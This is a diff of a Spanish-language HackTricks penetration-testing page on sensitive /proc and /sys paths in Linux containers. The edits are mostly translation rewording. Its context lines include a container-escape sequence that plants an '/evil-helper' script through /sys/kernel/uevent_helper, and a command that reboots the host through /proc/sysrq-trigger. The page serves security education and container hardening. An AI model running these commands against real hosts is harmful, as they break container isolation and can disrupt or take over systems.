@@ -2,19 +2,19 @@
 
 <details>
 
-<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprende a hackear AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Otras formas de apoyar a HackTricks:
 
 * Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
-* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Obtén la [**ropa oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
+* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-<figure><img src="../../../..https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
@@ -54,7 +54,7 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Verificar acceso a modprobe
 #### **`/proc/sys/vm/panic_on_oom`**
 
 * Referenciado en [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
-* Un indicador global que controla si el kernel entra en pánico o invoca al OOM killer cuando ocurre una condición de OOM.
+* Una bandera global que controla si el kernel entra en pánico o invoca al OOM killer cuando ocurre una condición de OOM.
 
 #### **`/proc/sys/fs`**
 
@@ -78,7 +78,7 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Verificar acceso a modprobe
 
 #### **`/proc/sysrq-trigger`**
 
-* Permite invocar comandos Sysrq, lo que potencialmente puede causar reinicios inmediatos del sistema u otras acciones críticas.
+* Permite invocar comandos Sysrq, potencialmente causando reinicios inmediatos del sistema u otras acciones críticas.
 *   **Ejemplo de Reinicio del Host**:
 
 ```bash
@@ -134,32 +134,32 @@ echo b > /proc/sysrq-trigger # Reinicia el host
 
 #### **`/sys/kernel/uevent_helper`**
 
-* Utilizado para manejar `uevents` de dispositivos del kernel.
-* Escribir en `/sys/kernel/uevent_helper` puede ejecutar scripts arbitrarios al activar `uevents`.
+* Utilizado para manejar los `uevents` de dispositivos del kernel.
+* Escribir en `/sys/kernel/uevent_helper` puede ejecutar scripts arbitrarios al activar `uevent` triggers.
 *   **Ejemplo de Explotación**: %%%bash
 
-### Crea un payload
+#### Crea un payload
 
 echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper
 
-### Encuentra la ruta del host desde el montaje de OverlayFS para el contenedor
+#### Encuentra la ruta del host desde el montaje de OverlayFS para el contenedor
 
 host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)
 
-### Establece uevent\_helper en el helper malicioso
+#### Establece uevent\_helper al helper malicioso
 
 echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper
 
-### Activa un uevent
+#### Activa un uevent
 
 echo change > /sys/class/mem/null/uevent
 
-### Lee la salida
+#### Lee la salida
 
 cat /output %%%
 #### **`/sys/class/thermal`**
 
-* Controla la configuración de temperatura, potencialmente causando ataques de denegación de servicio o daños físicos.
+* Controla la configuración de temperatura, potencialmente causando ataques DoS o daños físicos.
 
 #### **`/sys/kernel/vmcoreinfo`**
 
@@ -173,7 +173,7 @@ cat /output %%%
 #### **`/sys/firmware/efi/vars` y `/sys/firmware/efi/efivars`**
 
 * Expone interfaces para interactuar con variables EFI en la NVRAM.
-* La mala configuración o explotación puede llevar a laptops inutilizables o máquinas host no arrancables.
+* Una mala configuración o explotación puede llevar a laptops inutilizadas o máquinas host no arrancables.
 
 #### **`/sys/kernel/debug`**
 
@@ -186,7 +186,7 @@ cat /output %%%
 * [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
 * [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)
 
-<figure><img src="../../../..https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
@@ -200,6 +200,6 @@ Otras formas de apoyar a HackTricks:
 * Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.
 
 </details>
